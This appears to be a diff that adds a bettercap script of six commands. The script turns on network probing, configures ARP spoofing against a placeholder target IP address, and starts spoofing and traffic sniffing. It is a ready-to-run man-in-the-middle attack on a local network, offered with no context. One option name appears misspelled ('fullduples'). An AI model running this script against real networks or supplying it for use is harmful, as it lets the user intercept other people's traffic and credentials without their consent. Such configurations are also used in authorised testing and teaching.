@@ -1,0 +1,6 @@
+net.probe on
+set arp.spoof.fullduples true
+set arp.spoof.targets {target ip Address ex: 10.0.2.1}
+set net.sniff.local true
+arp.spoof on
+net.sniff on
